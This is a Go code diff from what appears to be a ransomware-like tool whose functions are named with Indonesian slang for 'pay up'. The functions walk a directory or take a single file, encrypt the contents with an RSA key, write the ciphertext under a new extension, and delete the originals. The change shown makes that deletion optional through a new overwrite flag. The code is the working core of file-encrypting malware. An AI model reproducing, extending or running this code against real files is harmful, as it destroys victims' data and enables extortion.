@@ -11,7 +11,7 @@ import (
 	"strings"
 )
 
-func MakeDirBayarCoek(dirPath string, extension string, privateKey *rsa.PrivateKey) error {
+func MakeDirBayarCoek(dirPath string, extension string, overwrite bool, privateKey *rsa.PrivateKey) error {
 	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
@@ -34,7 +34,9 @@ func MakeDirBayarCoek(dirPath string, extension string, privateKey *rsa.PrivateK
 				return err
 			}
 			err = os.WriteFile(parsedPath, ciphertext, 0777)
-			err = os.Remove(path)
+			if overwrite {
+				err = os.Remove(path)
+			}
 			if err != nil {
 				return err
 			}
@@ -51,7 +53,7 @@ func MakeDirBayarCoek(dirPath string, extension string, privateKey *rsa.PrivateK
 	return nil
 }
 
-func MakeSingleBayarCoek(filePath string, extension string, privateKey *rsa.PrivateKey) error {
+func MakeSingleBayarCoek(filePath string, extension string, overwrite bool, privateKey *rsa.PrivateKey) error {
 	info, err := os.Lstat(filePath)
 	if err != nil {
 		fmt.Printf("ERROR: %v\n", err)
@@ -90,7 +92,9 @@ func MakeSingleBayarCoek(filePath string, extension string, privateKey *rsa.Priv
 		return err
 	}
 	err = os.WriteFile(parsedPath, ciphertext, 0777)
-	err = os.Remove(filePath)
+	if overwrite {
+		err = os.Remove(filePath)
+	}
 	if err != nil {
 		fmt.Printf("ERROR: %v\n", err)
 		return err
